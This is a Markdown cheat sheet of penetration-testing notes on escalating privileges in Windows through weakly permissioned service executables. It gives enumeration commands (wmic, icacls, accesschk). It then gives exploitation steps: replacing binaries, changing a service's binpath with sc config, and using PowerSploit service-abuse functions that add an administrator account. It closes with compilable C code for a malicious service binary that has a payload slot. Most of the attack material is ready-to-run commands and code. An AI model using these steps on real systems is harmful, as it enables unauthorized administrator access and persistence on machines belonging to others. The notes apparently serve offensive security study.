# Windows Service Executable Permissions

- Check the permissions on service executables
- Check the permissions on them
- Replace the binary 

## Enumeration

- Find service binary paths

```
wmic service list full | find /i "pathname" | find /i /v "system32"
```

- Run icacls on the binary

```
icacls C:\Path\to\binary
```

- Or run accesschk64

```
accesschk64.exe -uwcv Everyone *
accesschk64.exe -wvuc C:\Path\To\Binary.exe
accesschk64.exe -wvuc <service name>

```

- Look for Write permissions 
- Look for SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS

- Or check powerup 

## Exploitation

- Replace the binary with a malicious one
- restart the service

```
sc start <servicename>
```

### sc config

- When running accesscheck if you have SERVICE_CHANGE_CONFIG, or SERVICE_ALL_ACCESS
- Check for the BINARY_PATH_NAME parameter 

```
sc qc <service name>
```

- Change the path to a command you want to run or a malicious binary

```
sc config <service name> binpath= "COMMAND TO RUN"
```

### Powersploit

#### Invoke-ServiceAbuse

https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-ServiceAbuse/

Adds a local user John with a password "Password123!":

```
Invoke-ServiceAbuse -Name <serviceName> 
```

- Adds a specified user to local admins group

```
Invoke-ServiceAbuse -Name <servicename> -UserName "Domain\User"
```

- Run a custom command

```
Invoke-ServiceAbuse -Name <servicename> -Command "..."
```

#### Write-ServiceBinary

https://powersploit.readthedocs.io/en/latest/Privesc/Write-ServiceBinary/

- Patches in the specified command to a pre-compiled C# service executable and writes the binary out to the specified ServicePath location.

- Add a local administrator john/Password123!

```
Write-ServiceBinary -Name <service>
```

- Add a specific user to local admins

```
Write-ServiceBinary -Name <service> -Username "Domain\User"
```

- Execute a specific command

```
Write-ServiceBinary -Name <service> -Command "..."
```

#### Install-ServiceBinary

- https://powersploit.readthedocs.io/en/latest/Privesc/Install-ServiceBinary/
- Replaces the service binary for the specified service with one that executes a specified command
- Add a local admin john/Password123!

```
Install-ServiceBinary -Name <service>
```

- Add a specific local admin

```
Install-ServiceBinary -Name <service> -UserName "Domain\user"
```

- Run a command 

```
Install-ServiceBinary -Name <service> -Command "..."
```

### Windows Service C

https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c

- Modify the payload and compile

```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```



```
#include <windows.h>
#include <stdio.h>

#define SLEEP_TIME 5000

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
 
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 

//add the payload here
int Run() 
{ 
    system("whoami > c:\\windows\\temp\\service.txt");
    return 0; 
} 

int main() 
{ 
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = "MyService";
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
 
    StartServiceCtrlDispatcher(ServiceTable);  
    return 0;
}

void ServiceMain(int argc, char** argv) 
{ 
    ServiceStatus.dwServiceType        = SERVICE_WIN32; 
    ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
    ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwWin32ExitCode      = 0; 
    ServiceStatus.dwServiceSpecificExitCode = 0; 
    ServiceStatus.dwCheckPoint         = 0; 
    ServiceStatus.dwWaitHint           = 0; 
 
    hStatus = RegisterServiceCtrlHandler("MyService", (LPHANDLER_FUNCTION)ControlHandler); 
    Run(); 
    
    ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
    SetServiceStatus (hStatus, &ServiceStatus);
 
    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
    {
		Sleep(SLEEP_TIME);
    }
    return; 
}

void ControlHandler(DWORD request) 
{ 
    switch(request) 
    { 
        case SERVICE_CONTROL_STOP: 
			ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
 
        case SERVICE_CONTROL_SHUTDOWN: 
            ServiceStatus.dwWin32ExitCode = 0; 
            ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
            SetServiceStatus (hStatus, &ServiceStatus);
            return; 
        
        default:
            break;
    } 
    SetServiceStatus (hStatus,  &ServiceStatus);
    return; 
} 

```

